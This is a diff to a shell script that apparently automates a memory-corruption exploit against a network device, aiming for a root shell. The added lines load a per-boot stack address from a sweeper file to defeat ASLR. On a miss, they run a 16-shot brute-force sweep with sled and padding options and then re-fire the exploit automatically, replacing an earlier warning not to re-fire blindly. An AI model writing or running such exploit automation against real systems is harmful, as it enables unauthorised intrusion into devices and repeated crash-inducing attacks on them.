@@ -19,6 +19,10 @@
 set -u
 HERE="$(cd "$(dirname "$0")" && pwd)"
 MAC="${MAC:-50:3d:d1:e3:e2:07}"
+# prefer the address the incremental sweeper found for THIS boot (ASLR shifts per boot)
+if [ -z "${ADDR:-}" ] && [ -r /tmp/c460_root_addr.txt ]; then
+  ADDR="$(head -1 /tmp/c460_root_addr.txt)"
+fi
 ADDR="${ADDR:-0xbef8b000}"
 OFFSET="${OFFSET:-1060}"
 LOG="${LOG:-/tmp/c460_fire.log}"
@@ -115,6 +119,20 @@ case "$out" in
     ;;
 esac
 
-log "no shell at $ADDR — DECODE-BUFFER zone; re-derive with a hang sweep, do not re-fire blindly"
+log "no shell at $ADDR — DECODE-BUFFER zone; sweeping to re-derive this boot's address"
 echo "noshell $ip $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"
+# 16-shot hang sweep around the missed address (0x400 steps); a HANG hit pins the boot's stack.
+SW_OUT="$( "$PY" "$GUARD" brute --host "$ip" --mac "$MAC" --addr "$ADDR" --offset "$OFFSET" \
+    --count 16 --step 0x400 --sled 0 --padpc 1 --sledfill --pcround 0x1000 --hang 2>&1 )"
+printf '%s\n' "$SW_OUT" >> "$LOG"
+case "$SW_OUT" in
+  *"HANG"*)
+    log "HANG hit during sweep — address re-derived; re-firing once"
+    rm -f "$STATE"
+    exec "$HERE/$(basename "$0")"
+    ;;
+  *)
+    log "sweep found no hang — boot address outside this window; incremental sweeper continues"
+    ;;
+esac
 exit 1
